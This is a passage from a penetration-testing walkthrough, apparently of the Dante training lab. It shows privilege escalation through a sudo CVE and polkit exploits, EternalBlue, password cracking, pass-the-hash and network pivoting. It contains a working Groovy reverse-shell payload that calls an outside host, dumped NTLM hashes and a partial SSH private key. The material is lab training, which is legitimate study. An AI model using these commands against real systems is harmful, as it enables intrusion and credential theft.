sudo su
su root
cd ../
cd julian
ls -al
sudo --version
exit
id
ls -al
cd julian/
cat .bash_history
ls -al
ls -lR .
exit
su root
mount
ls
find / -perm -4000 2>/dev/null   
sudo -u#-1 /bin/bash
exit
sudo -l
cd ..
ls
cd julian/
ls
id
whoami 
find / -perm -4000 2>/dev/null   
find . -exec /bin/bash -p \; -quit   
exit
```

Let’s upload linpeas and enumerate:

```bash
╔══════════╣ Operative system                                          
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                              
Linux version 5.4.0-48-generic (buildd@lcy01-amd64-023) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #52~18.04.1-Ubuntu SMP Thu Sep 10 12:
50:22 UTC 2020                                                                                                                                 
Distributor ID: Ubuntu                                                 
Description:    Ubuntu 18.04.4 LTS                                                                                                             
Release:        18.04                                                  
Codename:       bionic     

╔══════════╣ Sudo version                                                                                                                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                 
Sudo version 1.8.27   

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (ss)
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*     
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*     
tcp    LISTEN   0        5               127.0.0.1:631            0.0.0.0:*     
tcp    LISTEN   0        511                     *:443                  *:*     
tcp    LISTEN   0        80                      *:3306                 *:*     
tcp    LISTEN   0        511                     *:80                   *:*     
tcp    LISTEN   0        128                     *:21                   *:*     
tcp    LISTEN   0        128                  [::]:22                [::]:*     
tcp    LISTEN   0        5                   [::1]:631               [::]:* 

══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
pkexec version 0.105
```

CVE-2019-14287 is a vulnerability in sudo versions 1.8.27 to 1.8.31p2 that allows an attacker with sudo privileges to run commands as an arbitrary user (including root) by exploiting a flaw in the user ID specification with -u# or -u#-1, bypassing intended restrictions in the sudoers configuration.

[https://www.sudo.ws/security/advisories/minus_1_uid/](https://www.sudo.ws/security/advisories/minus_1_uid/)

We also see from bash history that the user tried the exploit command. Let’s go back to ben’s account and attempt to raise our privilege to root:

```bash
sudo -u#-1 /bin/bash
```

![image.png]({{ site.baseurl }}/assets/dante/image%2069.png)

We are now root.

Let’s also get all the hashes from /etc/shadow, we can build our credential file and see whether the username:password is reused:

```bash
cat /etc/shadow

<SNIP>
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
```

The only other user here is julian. Let’s crack with hashcat. Save the hash to a file

```bash
.\hashcat.exe -m 500 -a 0 ..\hashes.txt ..\rockyou.txt

$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:manchesterunited
```

Let’s save that to our creds.txt.

## 172.16.1.17 DANTE-NIX03

```bash
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
33060/tcp open  mysqlx
MAC Address: 00:50:56:94:91:F9 (Unknown)
```

hostname:

```bash
nxc smb 172.16.1.17 -u '' -p '' --shares

SMB         172.16.1.17     445    DANTE-NIX03      [*] Unix - Samba (name:DANTE-NIX03) (domain:) (signing:False) (SMBv1:False) 
SMB         172.16.1.17     445    DANTE-NIX03      [+] \: 
SMB         172.16.1.17     445    DANTE-NIX03      [*] Enumerated shares
SMB         172.16.1.17     445    DANTE-NIX03      Share           Permissions     Remark
SMB         172.16.1.17     445    DANTE-NIX03      -----           -----------     ------
SMB         172.16.1.17     445    DANTE-NIX03      forensics       READ,WRITE      
SMB         172.16.1.17     445    DANTE-NIX03      IPC$                            IPC Service (DANTE-NIX03 server (Samba, Ubuntu))

```

We have read and write share on forensics.

Let’s read what’s in the shares:

```bash
smbclient -N //172.16.1.17/forensics
```

There is only one file, `monitor`. Let’s download that. Using file command on it, we learn that it’s a pcap file. Let’s open it with wireshark:

![image.png]({{ site.baseurl }}/assets/dante/image%2070.png)

One thing that caught our eye was the HTTP request to /session_login.cgi

We right-click on the packet, and follow the HTTP stream:

![image.png]({{ site.baseurl }}/assets/dante/image%2071.png)

```bash
admin:password6543
```

It was visiting port 10000. Let’s try:

```bash
http://172.16.1.17:10000
```

![image.png]({{ site.baseurl }}/assets/dante/image%2072.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2073.png)

We go back to wireshark, we see another request to /session_login.cgi further down. Again, we follow the stream:

```bash
admin:Password6543
```

This time, we are logged in:

![image.png]({{ site.baseurl }}/assets/dante/image%2074.png)

In Others section, we find a command shell:

![image.png]({{ site.baseurl }}/assets/dante/image%2075.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2076.png)

We are root on the machine.

## 172.16.1.19 DANTE-NIX07

```bash
sudo nmap -p- 172.16.1.19 -v --min-rate=10000

PORT      STATE SERVICE
80/tcp    open  http
8080/tcp  open  http-proxy
33060/tcp open  mysqlx

sudo nmap 172.16.1.19 -sC -sV -p 80,8080,33060 -oN 172.16.1.19 

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp  open  http    Jetty 9.4.27.v20200227
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.27.v20200227)
| http-robots.txt: 1 disallowed entry 
|_/
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: Host: 127.0.0.1

```

Let’s visit the web page:

```bash
http://172.16.1.19
```

![image.png]({{ site.baseurl }}/assets/dante/image%2077.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2078.png)

The backend seem to be Ubuntu.

Let’s fuzz:

```bash
feroxbuster -u http://172.16.1.19 -C 404

[####################] - 1s         0/0       0s      found:0       errors:0      
[####################] - 0s     30000/30000   145631/s http://172.16.1.19/ => Directory listing (add --scan-dir-listings to scan) 

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://172.16.1.19/FUZZ -ic -e .php
```

### Jenkins

Let’s visit port 8080:

```bash
http://172.16.1.19:8080
```

![image.png]({{ site.baseurl }}/assets/dante/image%2079.png)

It’s a jenkins application.

From the nmap scan, we got the version. Let’s search up exploits: jetty 9.4.27 exploit.

Let’s try default password admin:admin. Denied.

Let’s try UDP scan:

```bash
sudo nmap 172.16.1.19 -sU -sC -sV -p 161,162 -oN 172.16.1.19_UDP

PORT    STATE         SERVICE  VERSION
161/udp open|filtered snmp
162/udp open|filtered snmptrap
```

Not a lot we can do without credentials.

We have a bunch of credentials we obtained from DC01. Let’s try bruteforcing with that. Let’s start metasploit:

```bash
msfconsole

search jenkins

use auxiliary/scanner/http/jenkins_login

set RHOSTS 172.16.1.19

set USER_FILE users.txt

set PASS_FILE pwds.txt

run
```

None are valid.

From compromising DC02, we find a batch script with jenkins login details. Let’s try that here:

```bash
net user Admin_129834765 SamsungOctober102030 /add

Admin_129834765:SamsungOctober102030
```

![image.png]({{ site.baseurl }}/assets/dante/image%2080.png)

We are on. Now let’s use the script console to get a reverse shell back.

```bash
http://172.16.1.19:8080/script
```

Now our reverse shell:

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.16.4/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Start our listener:

```bash
nc -lnvp 4444
```

Now execute.

![image.png]({{ site.baseurl }}/assets/dante/image%2081.png)

We have a shell back. Let’s upgrade:

```bash
script /dev/null -c bash
```

![image.png]({{ site.baseurl }}/assets/dante/image%2082.png)

We are on NIX07.

### Privilege Escalation NIX07

Let’s enumerate:

```bash
whoami

id

sudo -l
```

![image.png]({{ site.baseurl }}/assets/dante/image%2083.png)

Nothing interesting found in home dir as well. Let’s enumerate with linpeas.

```bash
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.4.0-48-generic (buildd@lcy01-amd64-010) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 202
0
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

Vulnerable to CVE-2021-3560
```

Searching up the CVE, we found this exploit from exploitdb:

https://www.exploit-db.com/exploits/50011

Let’s upload the exploit and see if it works. 

```bash
dos2unix exploit.sh  #change format from windows to unix

wget http://10.10.16.4/exploit.sh

chmod +x exploit.sh

./exploit.sh

[*] Vulnerable version of polkit found                                 
[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts 
```

Some ssh problem. Let’s find another way.

[https://github.com/swapravo/polkadots/blob/main/polkadots](https://github.com/swapravo/polkadots/blob/main/polkadots)

Let’s try this other exploit.

```bash
./polkadots

#enter iaminvincible!
```

We are now boris, which has sudo permissions. Now let’s switch to root:

```bash
sudo su - 
```

![image.png]({{ site.baseurl }}/assets/dante/image%2084.png)

Another way to get root is by monitoring running processes with pspy

```bash
./pspy64
```

![image.png]({{ site.baseurl }}/assets/dante/image%2085.png)

Let’s switch to user ian:

```bash
su ian

#VPN123ZXC
```

Let’s start basic enumeration:

```bash
id

uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)
```

Since we are part of the disk group, we have full access to any block device in /dev. Let’s check the mounted disks:

```bash
cat /proc/self/mounts | grep 'sda'

/dev/sda5 / ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda1 /boot/efi vfat rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro 0 0

```

sda5 is mounted at root, and we have read,write permission. Let’s use debugfs to read files in /:

```bash
debugfs /dev/sda5

debugfs:  cat /root/flag.txt
cat /root/flag.txt
DANTE{g0tta_<3_ins3cur3_GROupz!}

```

## 172.16.1.20 DANTE-DC01

```bash
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-serve
5985/tcp  open  wsman
8912/tcp  open  wcbackup
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49171/tcp open  unknown
49187/tcp open  unknown
49189/tcp open  unknown
49193/tcp open  unknown
49231/tcp open  unknown
65500/tcp open  unknown
65520/tcp open  unknown
MAC Address: 00:50:56:94:3B:D2 (Unknown)

sudo nmap -sC -sV -oN nmap/dante-dc01 172.16.1.20

22/tcp    open  ssh               OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 15:19:e6:66:c3:4f:f7:80:7e:48:f7:b9:9a:f9:ee:08 (RSA)
|   256 f3:ea:12:b5:fa:b0:0c:14:fb:65:98:0f:09:92:5c:56 (ECDSA)
|_  256 42:ca:16:67:5a:e7:a2:01:b0:63:4b:f7:ed:55:db:90 (ED25519)
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Microsoft-IIS/8.5
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-06 10:54:47Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http          Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 1 disallowed entry
|_/
|_ssl-date: 2025-11-06T10:55:51+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN:S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds      Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2025-11-06T10:55:51+00:00; +4s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DANTE
|   NetBIOS_Domain_Name: DANTE
|   NetBIOS_Computer_Name: DANTE-DC01
|   DNS_Domain_Name: DANTE.local
|   DNS_Computer_Name: DANTE-DC01.DANTE.local
|   DNS_Tree_Name: DANTE.local
|   Product_Version: 6.3.9600
|_  System_Time: 2025-11-06T10:55:41+00:00
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2025-11-05T08:39:29
|_Not valid after:  2026-05-07T08:39:29
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc             Microsoft Windows RPC
49153/tcp open  msrpc             Microsoft Windows RPC
49154/tcp open  msrpc             Microsoft Windows RPC
49155/tcp open  msrpc             Microsoft Windows RPC
49157/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc             Microsoft Windows RPC
49159/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-06T10:55:42
|_  start_date: 2025-11-06T08:41:20
|_clock-skew: mean: 4s, deviation: 0s, median: 3s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DANTE-DC01
|   NetBIOS computer name: DANTE-DC01\x00
|   Domain name: DANTE.local
|   Forest name: DANTE.local
|   FQDN: DANTE-DC01.DANTE.local
|_  System time: 2025-11-06T10:55:42+00:00
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:f7:4a (VMware)
| smb2-security-mode:
|   3:0:2:
|_    Message signing enabled and required

```

Let’s add the domain name and hostname to our /etc/hosts file:

```bash
172.16.1.20 dante.local DANTE-DC01.DANTE.local
```

hostname:

```bash
proxychains -q nxc smb 172.16.1.20 -u '' -p '' --shares

SMB         172.16.1.20     445    DANTE-DC01       [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [+] DANTE.local\: 
SMB         172.16.1.20     445    DANTE-DC01       [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

The build is vulnerable to eternal blue. Let’s use this:

```bash
msfconsole 
use exploit/windows/smb/ms17_010_psexec

set RHOSTS 172.16.1.20
set LHOST tun0

check 

[*] 172.16.1.20:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.16.1.20:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit)
[*] 172.16.1.20:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.20:445 - The target is vulnerable.
```

Now let’s run our exploit:

We got a shell back. Let’s check our privilege:

```bash
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

Since we are SYSTEM, let’s get all hashses.

```bash
meterpreter >hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49e6f37ede481d09747f6a0c9abcbaa7:::
SelfHealUser:1001:aad3b435b51404eeaad3b435b51404ee:236a174dfe9cf1f702ae493d934fb70e:::
katwamba:1002:aad3b435b51404eeaad3b435b51404ee:14a71f9e65448d83e8c63d46355837c3:::
mrb3n:2104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
xadmin:7104:aad3b435b51404eeaad3b435b51404ee:649f65073a6672a9898cb4eb61f9684a:::
DANTE-DC01$:1003:aad3b435b51404eeaad3b435b51404ee:ba31595ae9f6d6268b1ebd0f9a453a45:::
MediaAdmin$:1117:aad3b435b51404eeaad3b435b51404ee:83045c84cee486a985b530f98d278430:::
```

Let’s use nxc to verify the hashes:

```bash
└─$ nxc smb 172.16.1.20 -u Administrator -H 9bff06fe611486579fb74037890fda96 --shares
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [-] DANTE.local\Administrator:9bff06fe611486579fb74037890fda96 STATUS_ACCOUNT_DISABLED
                                                                       
┌──(kali㉿kali)-[~/pro-labs/dante]
└─$ nxc smb 172.16.1.20 -u xadmin -H 649f65073a6672a9898cb4eb61f9684a --shares
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [+] DANTE.local\xadmin:649f65073a6672a9898cb4eb61f9684a (Pwn3d!)
SMB         172.16.1.20     445    DANTE-DC01       [*] Enumerated shares
SMB         172.16.1.20     445    DANTE-DC01       Share           Permissions     Remark
SMB         172.16.1.20     445    DANTE-DC01       -----           -----------     ------
SMB         172.16.1.20     445    DANTE-DC01       ADMIN$          READ,WRITE      Remote Admin
SMB         172.16.1.20     445    DANTE-DC01       C$              READ,WRITE      Default share
SMB         172.16.1.20     445    DANTE-DC01       CertEnroll      READ,WRITE      Active Directory Certificate Services share
SMB         172.16.1.20     445    DANTE-DC01       Company         READ,WRITE      Company
SMB         172.16.1.20     445    DANTE-DC01       Department Shares READ,WRITE      
SMB         172.16.1.20     445    DANTE-DC01       File History Backups READ,WRITE      File History Backups
SMB         172.16.1.20     445    DANTE-DC01       Folder Redirection READ,WRITE      Folder Redirection
SMB         172.16.1.20     445    DANTE-DC01       IPC$            READ            Remote IPC
SMB         172.16.1.20     445    DANTE-DC01       NETLOGON        READ,WRITE      Logon server share 
SMB         172.16.1.20     445    DANTE-DC01       Shared Folders  READ            
SMB         172.16.1.20     445    DANTE-DC01       SYSVOL          READ,WRITE      Logon server share 
SMB         172.16.1.20     445    DANTE-DC01       Users           READ,WRITE      Users

```

xadmin is domain admin. We have compromised their account. 

```bash
evil-winrm -u xadmin -i dante.local -H 649f65073a6672a9898cb4eb61f9684a 
```

No flag in user’s Desktop. We enumerate to katwamba’s Desktop, we find:

```bash
cd C:\Users\katwamba\Desktop

dir

-a---         6/10/2020   1:32 PM       8790 employee_backup.xlsx
-a---          1/8/2021  12:29 PM         37 flag.txt

```

Let’s download the excel spreadsheet:

```bash
download employee_backup.xlsx
```

Let’s open it. 

We see that column B is missing:

![image.png]({{ site.baseurl }}/assets/dante/image%2086.png)

If we drag out column B, we get the passwords:

![image.png]({{ site.baseurl }}/assets/dante/image%2087.png)

We can put this into a list and perform password spray. First, we should find out the password policies so we don’t lock out any accounts:

```bash
nxc smb 172.16.1.20 -u xadmin -H 649f65073a6672a9898cb4eb61f9684a --pass-pol

SMB         172.16.1.20     445    DANTE-DC01       [+] Dumping password info for domain: DANTE
SMB         172.16.1.20     445    DANTE-DC01       Minimum password length: 7
SMB         172.16.1.20     445    DANTE-DC01       Password history length: 24
SMB         172.16.1.20     445    DANTE-DC01       Maximum password age: 179 days 23 hours 55 minutes 
SMB         172.16.1.20     445    DANTE-DC01       
SMB         172.16.1.20     445    DANTE-DC01       Password Complexity Flags: 000001
SMB         172.16.1.20     445    DANTE-DC01           Domain Refuse Password Change: 0
SMB         172.16.1.20     445    DANTE-DC01           Domain Password Store Cleartext: 0
SMB         172.16.1.20     445    DANTE-DC01           Domain Password Lockout Admins: 0
SMB         172.16.1.20     445    DANTE-DC01           Domain Password No Clear Change: 0
SMB         172.16.1.20     445    DANTE-DC01           Domain Password No Anon Change: 0
SMB         172.16.1.20     445    DANTE-DC01           Domain Password Complex: 1
SMB         172.16.1.20     445    DANTE-DC01       
SMB         172.16.1.20     445    DANTE-DC01       Minimum password age: None
SMB         172.16.1.20     445    DANTE-DC01       Reset Account Lockout Counter: 30 minutes 
SMB         172.16.1.20     445    DANTE-DC01       Locked Account Duration: 30 minutes 
SMB         172.16.1.20     445    DANTE-DC01       Account Lockout Threshold: None
SMB         172.16.1.20     445    DANTE-DC01       Forced Log off Time: Not Set
```

Not set. Put the users into one file, and the passwords into the other, let’s password spray:

```bash
nxc smb dante.local -u users.txt -p pwds.txt --continue-on-success
```

Not a single one successful. 

Let’s map out the AD as well. Upload SharpHound.exe:

```bash
upload SharpHound.exe

.\SharpHound.exe -c all

SharpHound.exe : 
    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Unhandled Exception: System.MissingMethodException: Method not found: '!!0[] System.Array.Empty()'.
   at Sharphound.Program.<Main>d__0.MoveNext()
   at System.Runtime.CompilerServices.AsyncMethodBuilderCore.Start[TStateMachine](TStateMachine& stateMachine)
   at Sharphound.Program.<Main>(String[] args)

```

Machine too old?

```bash
nxc ldap DANTE-DC01.DANTE.local -u xadmin -H 649f65073a6672a9898cb4eb61f9684a --dns-server 172.16.1.20 --bloodhound --collection All 
```

Success. We got the mapping. Let’s get all users as well:

```bash
nxc smb dante.local -u xadmin -H 649f65073a6672a9898cb4eb61f9684a --users

SMB         172.16.1.20     445    DANTE-DC01       [+] DANTE.local\xadmin:649f65073a6672a9898cb4eb61f9684a (Pwn3d!)
SMB         172.16.1.20     445    DANTE-DC01       -Username-                    -Last PW Set-       -BadPW- -Description-                    
SMB         172.16.1.20     445    DANTE-DC01       Administrator                 2020-06-10 11:36:17 0       Built-in account for administering the computer/domain
SMB         172.16.1.20     445    DANTE-DC01       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         172.16.1.20     445    DANTE-DC01       krbtgt                        2020-06-10 11:38:49 0       Key Distribution Center Service Account
SMB         172.16.1.20     445    DANTE-DC01       SelfHealUser                  2020-09-30 00:14:14 0        
SMB         172.16.1.20     445    DANTE-DC01       katwamba                      2020-06-10 12:46:43 0        
SMB         172.16.1.20     445    DANTE-DC01       mrb3n                         2020-07-31 15:43:25 0       mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
SMB         172.16.1.20     445    DANTE-DC01       xadmin                        2022-07-19 16:28:53 0        
SMB         172.16.1.20     445    DANTE-DC01       [*] Enumerated 7 local users: DANTE
```

We see a user left their password in the comment section.

We could’ve also found their password via our winrm session:

```bash
net user mrb3n

User name                    mrb3n
Full Name                    mrb3n
Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/31/2020 3:43:25 PM
Password expires             1/27/2021 3:43:25 PM
Password changeable          7/31/2020 3:43:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

```

### Lateral Movement DC01

Looking at the network information, we find another host on the 172.16.2.0/24 subnet:

```bash
netstat -ano 

<SNIP>
  TCP    172.16.1.20:49819      172.16.2.5:53          ESTABLISHED     5852
  TCP    172.16.1.20:49899      172.16.2.5:135         ESTABLISHED     5852
  TCP    172.16.1.20:50367      172.16.2.5:593         ESTABLISHED     5852
```

Let’s enable route to that host. 

Now we need a ligolo agent .exe on DC01. Let’s upoad with evil-winrm:

```bash
upload agent.exe
```

Now connect back to our pivot host:

```bash
.\agent.exe -connect 10.10.16.4:11601 -ignore-cert
```

Now let’s enable the session. Before that, let’s create another interface to reach 172.16.2.0/24 subnet:

```bash
sudo ip tuntap add user kali mode tun ligolo-double

sudo ip link set ligolo-double up
```

Back in our session:

```bash
session

#choose our new session

tunnel_start --tun ligolo-double
```

Now add route

```bash
sudo ip route add 172.16.2.0/24 dev ligolo-double
```

Now let’s test our connection:

```bash
ping -c 1 172.16.2.5

PING 172.16.2.5 (172.16.2.5) 56(84) bytes of data.
64 bytes from 172.16.2.5: icmp_seq=1 ttl=64 time=78.0 ms

--- 172.16.2.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 77.991/77.991/77.991/0.000 ms
```

Our routing table on ligolo-ng should look like this:

```bash
route_list
```

![image.png]({{ site.baseurl }}/assets/dante/image%2088.png)

Let’s RDP:

```bash
xfreerdp3 /u:xadmin /v:172.16.1.20 /pth:649f65073a6672a9898cb4eb61f9684a

[07:55:39:597] [110663:0001b047] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /pth is insecure
[07:55:39:597] [110663:0001b047] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[07:55:39:597] [110663:0001b047] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
[07:55:39:597] [110663:0001b047] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - /args-from: pipe in arguments from stdin, file or file descriptor
[07:55:39:597] [110663:0001b047] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - /from-stdin pass the credential via stdin
[07:55:39:597] [110663:0001b047] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - set environment variable FREERDP_ASKPASS to have a gui tool query for credentials
[07:55:39:600] [110663:0001b049] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
[07:55:39:600] [110663:0001b049] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x5d -> no RDP scancode found
[07:55:39:790] [110663:0001b049] [ERROR][com.freerdp.crypto] - [freerdp_tls_handshake]: BIO_do_handshake failed
[07:55:39:790] [110663:0001b049] [ERROR][com.freerdp.core] - [transport_default_connect_tls]: ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]
                                                                                                                                         
```

Denied.

Let’s extract with lazagne

```bash
.\LaZagne.exe all

########## User: katwamba ##########

------------------- Opensshforwindows passwords -----------------

[+] Privatekey found !!!
Privatekey: 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAuCtwi65p1IoSFq6OM3YpHQ3KdkRg+vhYhARrMmon6piqjJGggI4O
rJVI0gyPtldoOg0AO3gIh8WVjWqz7uenRiyRJ8jUgVAXsTdJmbs5zECNEk5LjUfv/byLhc
1Ga+R21ppIqNWdbScJbYKFMUekCILwALLp7ltxdSWntwxLQqhWKq6XeXveqF4qx6dMzHyk
8wY0V21B4x2v+PPotoJS7bCUA8DIOZu1i8Zd5KaRgnljKko6jNKx37wn80ESct4RYG9r3n
sL6H7w/suvuqs8dqfC37ajiB5A0Y2QBA0nIeyZjTTxQ5MHX10a7wE0oVubJWnM4nsX7lyI
p5F3yCuA7z4vkn+DeGXTQPoMzqvGLYvSZXLdTgQ6gP1HjcCXV6CkuNLoUXi7tNrd9UYtV3
RfvxxkJRiTAYlmdWIzX0GFo2nKCezsrTUMl56KYctTYohCmCdNzHaSa0Y9Q8RYAugRyiCZ
3H1DR0y1vkGyWjWYUFGksNTSyZrkzzs3ADvu9wA1AAAFkCXEzNMlxMzTAAAAB3NzaC1yc2
EAAAGBALgrcIuuadSKEhaujjN2KR0NynZEYPr4WIQEazJqJ+qYqoyRoICODqyVSNIMj7ZX
aDoNADt4CIfFlY1qs+7np0YskSfI1IFQF7E3SZm7OcxAjRJOS41H7/28i4XNRmvkdtaaSK
jVnW0nCW2ChTFHpAiC8ACy6e5bcXUlp7cMS0KoViqul3l73qheKsenTMx8pPMGNFdtQeMd
r/jz6LaCUu2wlAPAyDmbtYvGXeSmkYJ5YypKOozSsd+8J/NBEnLeEWBva957C+h+8P7Lr7
qrPHanwt+2o4geQNGNkAQNJyHsmY008UOTB19dGu8BNKFbmyVpzOJ7F+5ciKeRd8grgO8+
L5J/g3hl00D6DM6rxi2L0mVy3U4EOoD9R43Al1egpLjS6FF4u7Ta3fVGLVd0X78cZCUYkw
GJZnViM19BhaNpygns7K01DJeeimHLU2KIQpgnTcx2kmtGPUPEWALoEcogmdx9Q0dMtb5B
